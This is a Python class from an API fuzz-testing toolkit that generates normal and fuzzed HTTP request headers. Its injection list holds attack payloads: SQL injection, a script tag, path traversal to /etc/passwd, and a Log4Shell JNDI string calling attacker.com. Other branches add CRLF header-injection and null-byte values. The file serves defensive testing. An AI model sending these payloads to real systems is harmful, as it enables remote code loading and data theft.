import random
import json
from typing import Any, Dict

from api_testing.inputs.fuzz_strategy import FuzzStrategy
from .random_generator import RandomGenerator

class HeaderRequestGenerator(RandomGenerator):
    """
    Generates HTTP headers for API requests.
    Inspired by APIFuzzer's pre_defined_headers, this generator takes a base
    set of headers and provides fuzzed variations to test server resilience.
    """
    
    description: str = "Generates valid and fuzzed HTTP request header dictionaries."

    def __init__(self, base_headers: Dict[str, str] = None, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.base_headers = base_headers or {
            "User-Agent": "APIFuzzer-Generator/1.0",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "en-US,en;q=0.9",
            "Authorization": "Bearer <default_token>",
            "X-Api-Key": "<default_api_key>",
            "Cookie": "session_id=default_session_value",
            "Connection": "keep-alive",
            "Cache-Control": "no-cache",
            "Pragma": "no-cache",
            "Host": "localhost",
            "Origin": "http://localhost",
            "Referer": "http://localhost/api/docs",
            "X-Forwarded-For": "127.0.0.1",
            "X-Real-IP": "127.0.0.1",
            "X-Request-ID": "123e4567-e89b-12d3-a456-426614174000",
            "X-Correlation-ID": "correlation-12345"
        }

    def next_value(self) -> Dict[str, str]:
        """Returns the valid base headers."""
        return self.base_headers.copy()

    def next_value_as_string(self) -> str:
        """Returns headers as a JSON string representation."""
        return json.dumps(self.next_value())

    def next_fuzz_value(self) -> Any:
        """
        Applies a fuzzing strategy to the headers.
        It randomly targets one header key to mutate, corrupt, or drop.
        """
        if not self.base_headers:
            return {}

        fuzzed_headers = self.base_headers.copy()
        
        target_key = self.rand.choice(list(fuzzed_headers.keys()))

        supported_strategies = [
            FuzzStrategy.LARGE,
            FuzzStrategy.INJECTION,
            FuzzStrategy.CORRUPT,
            FuzzStrategy.WRONG_TYPE,
            FuzzStrategy.JUNK,
            FuzzStrategy.STRUCTURE
        ]
        
        strategy = self.rand.choice(supported_strategies)

        if strategy == FuzzStrategy.LARGE:
            fuzzed_headers[target_key] = "A" * 10000

        elif strategy == FuzzStrategy.INJECTION:
            payloads = [
                "' OR 1=1 --",
                "<script>alert(1)</script>",
                "../../../../etc/passwd",
                "${jndi:ldap://attacker.com/a}"
            ]
            fuzzed_headers[target_key] = self.rand.choice(payloads)

        elif strategy == FuzzStrategy.CORRUPT:
            corruptions = [
                f"{fuzzed_headers[target_key]}\r\nInjected-Header: true", 
                f"{fuzzed_headers[target_key]}\x00",
                "\xff\xfe\xfd"
            ]
            fuzzed_headers[target_key] = self.rand.choice(corruptions)

        elif strategy == FuzzStrategy.WRONG_TYPE:
            fuzzed_headers[target_key] = str({"invalid": "type", "array": [1, 2]})

        elif strategy == FuzzStrategy.JUNK:
            junk_chars = [chr(self.rand.randint(0, 255)) for _ in range(20)]
            fuzzed_headers[target_key] = "".join(junk_chars)

        elif strategy == FuzzStrategy.STRUCTURE:
            val = fuzzed_headers.pop(target_key)
            if self.rand.random() > 0.5:
                fuzzed_headers[f"{target_key}_"] = val
            else:
                fuzzed_headers[f"_{target_key}"] = val

        return fuzzed_headers